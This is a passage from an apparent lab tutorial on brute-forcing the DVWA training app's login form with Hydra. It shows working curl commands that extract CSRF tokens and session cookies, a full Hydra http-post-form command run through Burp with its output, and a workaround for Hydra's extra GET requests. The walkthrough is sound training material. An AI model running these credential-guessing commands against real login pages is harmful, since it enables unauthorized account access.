&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;hydra
&lt;/span&gt;&lt;span class="line"&gt;hydra -h
&lt;/span&gt;&lt;span class="line"&gt;hydra -U http-post-form
&lt;/span&gt;&lt;span class="line"&gt;man hydra
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;I will extract from the output what I think we'll use:&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;span class="line-number"&gt;24&lt;/span&gt;
&lt;span class="line-number"&gt;25&lt;/span&gt;
&lt;span class="line-number"&gt;26&lt;/span&gt;
&lt;span class="line-number"&gt;27&lt;/span&gt;
&lt;span class="line-number"&gt;28&lt;/span&gt;
&lt;span class="line-number"&gt;29&lt;/span&gt;
&lt;span class="line-number"&gt;30&lt;/span&gt;
&lt;span class="line-number"&gt;31&lt;/span&gt;
&lt;span class="line-number"&gt;32&lt;/span&gt;
&lt;span class="line-number"&gt;33&lt;/span&gt;
&lt;span class="line-number"&gt;34&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
&lt;/span&gt;&lt;span class="line"&gt;  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
&lt;/span&gt;&lt;span class="line"&gt;  -e nsr    try &lt;span class="s2"&gt;&amp;quot;n&amp;quot;&lt;/span&gt; null password, &lt;span class="s2"&gt;&amp;quot;s&amp;quot;&lt;/span&gt; login as pass and/or &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; reversed login
&lt;/span&gt;&lt;span class="line"&gt;  -u        loop around users, not passwords &lt;span class="o"&gt;(&lt;/span&gt;effective! implied with -x&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -f / -F   &lt;span class="nb"&gt;exit &lt;/span&gt;when a login/pass pair is found &lt;span class="o"&gt;(&lt;/span&gt;-M: -f per host, -F global&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -t TASKS  run TASKS number of connects in parallel &lt;span class="o"&gt;(&lt;/span&gt;per host, default: 16&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  -w / -W TIME  waittime &lt;span class="k"&gt;for&lt;/span&gt; responses &lt;span class="o"&gt;(&lt;/span&gt;32s&lt;span class="o"&gt;)&lt;/span&gt; / between connects per thread
&lt;/span&gt;&lt;span class="line"&gt;  -v / -V / -d  verbose mode / show login+pass &lt;span class="k"&gt;for&lt;/span&gt; each attempt / debug mode
&lt;/span&gt;&lt;span class="line"&gt;  -q        &lt;span class="k"&gt;do&lt;/span&gt; not print messages about connection errors
&lt;/span&gt;&lt;span class="line"&gt;  -U        service module usage details
&lt;/span&gt;&lt;span class="line"&gt;  server    the target: DNS, IP or 192.168.0.0/24 &lt;span class="o"&gt;(&lt;/span&gt;this OR the -M option&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  service   the service to crack &lt;span class="o"&gt;(&lt;/span&gt;see below &lt;span class="k"&gt;for&lt;/span&gt; supported protocols&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;  OPT       some service modules support additional input &lt;span class="o"&gt;(&lt;/span&gt;-U &lt;span class="k"&gt;for&lt;/span&gt; module &lt;span class="nb"&gt;help&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;HYDRA_PROXY_HTTP or HYDRA_PROXY - and &lt;span class="k"&gt;if&lt;/span&gt; needed HYDRA_PROXY_AUTH - environment &lt;span class="k"&gt;for&lt;/span&gt; a proxy setup.
&lt;/span&gt;&lt;span class="line"&gt;E.g.:  % &lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;HYDRA_PROXY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;socks5://127.0.0.1:9150 &lt;span class="o"&gt;(&lt;/span&gt;or socks4:// or connect://&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;       % &lt;span class="nb"&gt;export &lt;/span&gt;&lt;span class="nv"&gt;HYDRA_PROXY_HTTP&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;http://proxy:8080
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Syntax:   &amp;lt;url&amp;gt;:&amp;lt;form parameters&amp;gt;:&amp;lt;condition string&amp;gt;&lt;span class="o"&gt;[&lt;/span&gt;:&amp;lt;optional&amp;gt;&lt;span class="o"&gt;[&lt;/span&gt;:&amp;lt;optional&amp;gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Third is the string that it checks &lt;span class="k"&gt;for&lt;/span&gt; an *invalid* login &lt;span class="o"&gt;(&lt;/span&gt;by default&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt; Invalid condition login check can be preceded by &lt;span class="s2"&gt;&amp;quot;F=&amp;quot;&lt;/span&gt;, successful condition
&lt;/span&gt;&lt;span class="line"&gt; login check must be preceded by &lt;span class="s2"&gt;&amp;quot;S=&amp;quot;&lt;/span&gt;.
&lt;/span&gt;&lt;span class="line"&gt; This is where most people get it wrong. You have to check the webapp what a
&lt;/span&gt;&lt;span class="line"&gt; failed string looks like and put it in this parameter!
&lt;/span&gt;&lt;span class="line"&gt; &lt;span class="s2"&gt;&amp;quot;/login.php:user=^USER^&amp;amp;pass=^PASS^:incorrect&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;...SNIP...
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Note that &lt;span class="k"&gt;if&lt;/span&gt; you are going to put colons &lt;span class="o"&gt;(&lt;/span&gt;:&lt;span class="o"&gt;)&lt;/span&gt; in your headers you should escape them with a backslash &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="se"&gt;\)&lt;/span&gt;.
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;We now have a slightly better idea how the tool works =).&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Hydra..Test.Debug.Command."&gt;&lt;/a&gt;
&lt;h3&gt;Hydra (Test/Debug Command)&lt;/h3&gt;

&lt;p&gt;The smart way to go about attacking anything, is to setup a test environment where you know &amp;amp; control everything, rather than trying to attack a production box straight away (then we would know what page we would be redirected to when successfully logged in).&lt;/p&gt;

&lt;p&gt;Really, we should have done everything so far in a test environment. However, as this is a training lab it does not matter too much. Having a cloned environment under our control, would allow us to know what valid credentials there would be. As this is a training lab, we have already been given valid credentials, so we do not need to re-setup again (and being stealthy here is not an objective).&lt;/p&gt;

&lt;p&gt;As we are not fully sure what a valid response would look like, we could login via cURL as before. But let's push the boat out and expand our skill set. Let's use a proxy to intercept the requests and monitor. There are various options; however, I've picked Burp Proxy Suite.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As we already know what the credential is&lt;/strong&gt; (&lt;code&gt;admin:password&lt;/code&gt;), let's statically add them in, letting us test our Hydra command.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;span class="line-number"&gt;9&lt;/span&gt;
&lt;span class="line-number"&gt;10&lt;/span&gt;
&lt;span class="line-number"&gt;11&lt;/span&gt;
&lt;span class="line-number"&gt;12&lt;/span&gt;
&lt;span class="line-number"&gt;13&lt;/span&gt;
&lt;span class="line-number"&gt;14&lt;/span&gt;
&lt;span class="line-number"&gt;15&lt;/span&gt;
&lt;span class="line-number"&gt;16&lt;/span&gt;
&lt;span class="line-number"&gt;17&lt;/span&gt;
&lt;span class="line-number"&gt;18&lt;/span&gt;
&lt;span class="line-number"&gt;19&lt;/span&gt;
&lt;span class="line-number"&gt;20&lt;/span&gt;
&lt;span class="line-number"&gt;21&lt;/span&gt;
&lt;span class="line-number"&gt;22&lt;/span&gt;
&lt;span class="line-number"&gt;23&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# CSRF=$(curl -s -c dvwa.cookie 192.168.1.33/DVWA/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d &amp;quot;'&amp;quot; -f2)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# rm -f hydra.restore&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;# hydra -l admin -p password -e ns -u -F -t 1 -w 10 -W 1 -v -V 192.168.1.33 http-post-form &amp;quot;/DVWA/login.php:username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login:F=Location\: login.php:C=/404.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&amp;quot;&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra v8.1 &lt;span class="o"&gt;(&lt;/span&gt;c&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="m"&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span class="k"&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span class="k"&gt;for&lt;/span&gt; illegal purposes.
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; starting at 2015-10-15 21:05:13
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt; Using HTTP Proxy: http://127.0.0.1:8080
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;INFORMATION&lt;span class="o"&gt;]&lt;/span&gt; escape sequence &lt;span class="se"&gt;\:&lt;/span&gt; detected in module option, no parameter verification is performed.
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; max &lt;span class="m"&gt;1&lt;/span&gt; task per &lt;span class="m"&gt;1&lt;/span&gt; server, overall &lt;span class="m"&gt;64&lt;/span&gt; tasks, &lt;span class="m"&gt;3&lt;/span&gt; login tries &lt;span class="o"&gt;(&lt;/span&gt;l:1/p:3&lt;span class="o"&gt;)&lt;/span&gt;, ~0 tries per task
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;DATA&lt;span class="o"&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Resolving addresses ... &lt;span class="k"&gt;done&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;2&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;ATTEMPT&lt;span class="o"&gt;]&lt;/span&gt; target 192.168.1.33 - login &lt;span class="s2"&gt;&amp;quot;admin&amp;quot;&lt;/span&gt; - pass &lt;span class="s2"&gt;&amp;quot;password&amp;quot;&lt;/span&gt; - &lt;span class="m"&gt;3&lt;/span&gt; of &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="o"&gt;[&lt;/span&gt;child 0&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;VERBOSE&lt;span class="o"&gt;]&lt;/span&gt; Page redirected to http://192.168.1.33/DVWA/index.php
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;STATUS&lt;span class="o"&gt;]&lt;/span&gt; attack finished &lt;span class="k"&gt;for&lt;/span&gt; 192.168.1.33 &lt;span class="o"&gt;(&lt;/span&gt;waiting &lt;span class="k"&gt;for&lt;/span&gt; children to &lt;span class="nb"&gt;complete &lt;/span&gt;tests&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="m"&gt;1&lt;/span&gt; of &lt;span class="m"&gt;1&lt;/span&gt; target completed, &lt;span class="m"&gt;0&lt;/span&gt; valid passwords found
&lt;/span&gt;&lt;span class="line"&gt;Hydra &lt;span class="o"&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span class="o"&gt;)&lt;/span&gt; finished at 2015-10-15 21:05:29
&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="o"&gt;[&lt;/span&gt;root:~&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="c"&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;&lt;img alt="Test/Debug Command" src="https://blog.g0tmi1k.com/images/dvwa-login-10.png" /&gt;&lt;/p&gt;

&lt;p&gt;There is a lot going on in this snippet. Let's break it down.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The first two commands are generating and then exacting the necessary fields (similar to before). So we have acquired fresh, valid &lt;code&gt;PHPSESSID&lt;/code&gt; and &lt;code&gt;user_token&lt;/code&gt; values). The extra line (&lt;code&gt;SESSIONID=$...&lt;/code&gt;) is because Hydra is unable to read the cookie file so we need to manually extract the values.&lt;/li&gt;
&lt;li&gt;The next two commands are configuring Hydra. The first one instructs it to use a HTTP proxy &lt;code&gt;export HYDRA_PROXY_HTTP=http://127.0.0.1:8080&lt;/code&gt; (for which we already have Burp, up and listening. Intercept is turned off). The other &lt;code&gt;rm -f hydra.restore&lt;/code&gt;, cleans up any previous traces of any Hydra sessions (useful if we have to stop, and re-run the commands multiple times).&lt;/li&gt;
&lt;li&gt;The last command is the main command. This is what performs the brute force

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-l admin&lt;/code&gt; - static usernames.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-p password&lt;/code&gt; - static password.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-e ns&lt;/code&gt; - empty password &amp;amp; login as password.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-u&lt;/code&gt; - loop username first, rather than password &lt;em&gt;(Does not matter here, due to only 1 username)&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-F&lt;/code&gt; - quit after finding any login credentials.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-t 1&lt;/code&gt; - Only one thread (easier to track with Burp).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-w 10&lt;/code&gt; - timeout value for each thread (easier to manage with Burp in case we want to quickly intercept anything).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-W 1&lt;/code&gt; - Wait 1 second before moving on to the next request (kinder to the host/database/Burp).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-v&lt;/code&gt; - makes the output more verbose - so we can see redirects.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;-V&lt;/code&gt; - display all attempts.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;192.168.1.33&lt;/code&gt; - IP/hostname of the machine to attack.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;http-post-form&lt;/code&gt; - module and method to use.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/DVWA/login.php&lt;/code&gt; - path to the page.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;username=^USER^&amp;amp;password=^PASS^&amp;amp;user_token=${CSRF}&amp;amp;Login=Login&lt;/code&gt; - POST data to send.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;F=Location\: login.php&lt;/code&gt; - key here, filter out all redirects that are NOT login.php (Blacklisting).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;C=/404.php&lt;/code&gt; - see the next section below. Possible bug in Hydra?&lt;/li&gt;
&lt;li&gt;&lt;code&gt;H=Cookie: security=impossible; PHPSESSID=${SESSIONID}&lt;/code&gt; - the cookie values to send during brute force.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;By doing all of this, we can see when we use &lt;code&gt;admin&lt;/code&gt; &amp;amp; &lt;code&gt;password&lt;/code&gt; for the username &amp;amp; password; we are then redirected to a different page, &lt;code&gt;/DVWA/index.php&lt;/code&gt;. This sounds like a successful login!&lt;/p&gt;

&lt;p&gt;Note: Hydra does not say there is a successful login. Just the fact we have verbose enabled shows there has been a redirect.&lt;/p&gt;

&lt;hr /&gt;

&lt;a name="Hydra.Issues"&gt;&lt;/a&gt;
&lt;h3&gt;Hydra Issues&lt;/h3&gt;

&lt;a name="Issue..1..Additional.GET.Requests."&gt;&lt;/a&gt;
&lt;h4&gt;Issue #1 (Additional GET Requests)&lt;/h4&gt;

&lt;p&gt;During the testing of Hydra command, I noticed hydra was making unwanted GET requests (&lt;strong&gt;this is why we test before attacking&lt;/strong&gt;)! As a result, hydra was not able to detect the correct known login (because we are in a test lab).&lt;/p&gt;

&lt;p&gt;&lt;img alt="Additional GET Requests" src="https://blog.g0tmi1k.com/images/dvwa-login-11.png" /&gt;&lt;/p&gt;

&lt;p&gt;The GET requests were loading the &lt;code&gt;/DVWA/login.php&lt;/code&gt; page again, and as we know from using cURL before - this will cause a new &lt;code&gt;PHPSESSID&lt;/code&gt; which does not match the &lt;code&gt;CSRF&lt;/code&gt; token.&lt;/p&gt;

&lt;p&gt;The GET request is happening before the POST request, so it is not following the redirect. What it is doing is mincing the page loading request, before trying to brute force it.&lt;/p&gt;

&lt;p&gt;The GET request is not using any of the parameters, just a direct page load. The POST request was ours and contained the values we wanted.&lt;/p&gt;

&lt;p&gt;So, back to the help screens...&lt;/p&gt;

&lt;p&gt;At first glance, nothing jumped out regarding CSRF, or being able to make dynamic requests, or executing commands before making the request (so we could have some "bash fu"). After reading it in more depth (rather than just skimming for certain phrases), the following line might be useful...&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;&lt;span class="nv"&gt;C&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/page/uri     to define a different page to gather initial cookies from
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/figure&gt;


&lt;p&gt;We do not want it to get cookies from another page, as we are already setting them in the request. However, it is making the request initially before our POST request. So let's try it out.&lt;/p&gt;

&lt;p&gt;We do not want it to make a request to the web application (as that possibly makes another session token), so let's just point it to any made up page that is not on the web server. Quick test, &lt;code&gt;/404.php&lt;/code&gt; is not there! So putting it into Hydra: &lt;code&gt;C=/404.php&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Note: after messing about a bit more, the value could have been left blank - e.g. &lt;code&gt;C=&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;This could be a possible bug with Hydra (I was using Hydra v8.1 &amp;amp; v8.2. The latter is currently in development and not yet released), or I could just have been using it wrong.&lt;/p&gt;

&lt;figure class="code"&gt;&lt;figcaption&gt;&lt;span&gt;&lt;/span&gt;&lt;/figcaption&gt;&lt;div class="highlight"&gt;&lt;table&gt;&lt;tr&gt;&lt;td class="gutter"&gt;&lt;pre class="line-numbers"&gt;&lt;span class="line-number"&gt;1&lt;/span&gt;
&lt;span class="line-number"&gt;2&lt;/span&gt;
&lt;span class="line-number"&gt;3&lt;/span&gt;
&lt;span class="line-number"&gt;4&lt;/span&gt;
&lt;span class="line-number"&gt;5&lt;/span&gt;
&lt;span class="line-number"&gt;6&lt;/span&gt;
&lt;span class="line-number"&gt;7&lt;/span&gt;
&lt;span class="line-number"&gt;8&lt;/span&gt;
&lt;/pre&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;pre&gt;&lt;code class="bash"&gt;&lt;span class="line"&gt;Before:
&lt;/span&gt;&lt;span class="line"&gt;/DVWA/login.php:username&lt;span class="o"&gt;=&lt;/span&gt;^USER^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;^PASS^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;user_token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login:F&lt;span class="o"&gt;=&lt;/span&gt;Location&lt;span class="se"&gt;\:&lt;/span&gt; login.php:H&lt;span class="o"&gt;=&lt;/span&gt;Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;After:
&lt;/span&gt;&lt;span class="line"&gt;/DVWA/login.php:username&lt;span class="o"&gt;=&lt;/span&gt;^USER^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;^PASS^&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;user_token&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;CSRF&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nv"&gt;Login&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;Login:F&lt;span class="o"&gt;=&lt;/span&gt;Location&lt;span class="se"&gt;\:&lt;/span&gt; login.php:C&lt;span class="o"&gt;=&lt;/span&gt;/pointlessfile.php:H&lt;span class="o"&gt;=&lt;/span&gt;Cookie: &lt;span class="nv"&gt;security&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;impossible&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PHPSESSID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="k"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SESSIONID&lt;/span&gt;&lt;span class="k"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="line"&gt;
&lt;/span&gt;&lt;span class="line"&gt;Also works:
